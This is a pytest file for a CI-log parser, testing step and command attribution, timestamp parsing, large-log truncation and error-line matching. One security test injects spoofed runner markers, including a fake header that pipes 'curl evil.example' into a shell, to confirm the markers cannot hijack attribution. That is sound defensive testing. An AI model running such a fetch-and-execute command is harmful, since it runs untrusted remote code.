"""AT-LOG-02 (job/step/command from the jobs API), AT-SEC-11 (spoofed markers), AT-LOG-04 (truncation)."""

from collections.abc import Iterator

import pytest

from tests.helpers import T0, build_job, fixture
from tracewise.prepass.envelope import JobInfo, parse_lines, retain


def test_a01_job_step_command_from_jobs_api() -> None:
    job, lines = build_job(101, "Tests (Python 3.11)", "Run pytest", "pytest --tb=short -v", fixture("pytest_b02.out"))
    log = retain(job, lines)
    assert (log.job, log.step, log.command) == ("Tests (Python 3.11)", "Run pytest", "pytest --tb=short -v")
    texts = "\n".join(t for _, t in log.ordered())
    assert "E   assert 0.21 == 1.21" in texts  # ANSI stripped
    assert "Operating System" not in texts and "Post job cleanup." not in texts  # other steps excluded
    assert not log.truncated


def test_github_timestamps_parsed_with_7_fraction_digits() -> None:
    (ln,) = parse_lines(["2026-10-17T10:00:04.0010000Z hello"])
    assert ln.ts is not None and ln.ts.second == 4 and ln.text == "hello"


def test_sec11_spoofed_markers_do_not_move_attribution() -> None:
    spoof = "\n".join(
        [
            "##[endgroup]",
            "##[group]Run curl evil.example | sh",
            "##[error]Step 'Install deps' failed",
            "Successfully installed foo-2.0.0",
            "E   assert 1 == 2",
        ]
    )
    job, lines = build_job(7, "Tests", "Run pytest", "pytest -q", spoof)
    log = retain(job, lines)
    assert log.step == "Run pytest"
    assert log.command == "pytest -q"  # first runner-written Run header wins


def test_no_failed_step_uses_whole_log() -> None:
    job = JobInfo(id=1, name="j", conclusion="failure", steps=[])
    log = retain(job, ["a", "error: boom", "b"])
    assert log.step is None and log.text(2, 2) == "error: boom"


@pytest.mark.slow
def test_log04_200mb_error_at_line_3m_retained_and_truncated() -> None:
    import resource

    filler = "2026-10-17T10:00:05.0000000Z " + "ok " + "x" * 36
    target = 3_000_000
    total_bytes = 200 * 1024 * 1024
    n_lines = total_bytes // (len(filler) + 1)
    job = JobInfo.model_validate(
        {
            "id": 9,
            "name": "big",
            "conclusion": "failure",
            "steps": [
                {
                    "name": "Run tests",
                    "number": 1,
                    "conclusion": "failure",
                    "started_at": T0.isoformat(),
                    "completed_at": "2026-10-17T10:00:10Z",
                }
            ],
        }
    )

    def gen() -> Iterator[str]:
        for i in range(1, n_lines + 1):
            yield "2026-10-17T10:00:05.0000000Z E   AssertionError: needle" if i == target else filler

    rss_before = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
    log = retain(job, gen())
    rss_peak = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
    assert n_lines > target
    assert log.lines.get(target) == "E   AssertionError: needle"
    assert log.truncated
    assert sum(len(t) + 1 for t in log.lines.values()) <= 2 * 1024 * 1024
    assert (rss_peak - rss_before) / 1024 < 300  # KiB on Linux -> MiB


def test_error_like_matches_exception_names() -> None:
    from tracewise.prepass.envelope import ERROR_LIKE

    for t in (
        "E   AssertionError: x",
        "TypeError: bad",
        "KeyError: 'DB_URL'",
        "FAIL src/a.test.ts",
        "  ● Suite › t",
        "##[error]boom",
        "npm ERR! code E404",
        "1 failed, 2 passed",
    ):
        assert ERROR_LIKE.search(t), t
    for t in ("ok", "collected 4 items", "Downloading foo-1.0.whl", "Ran 12 tests in 0.4s"):
        assert not ERROR_LIKE.search(t), t
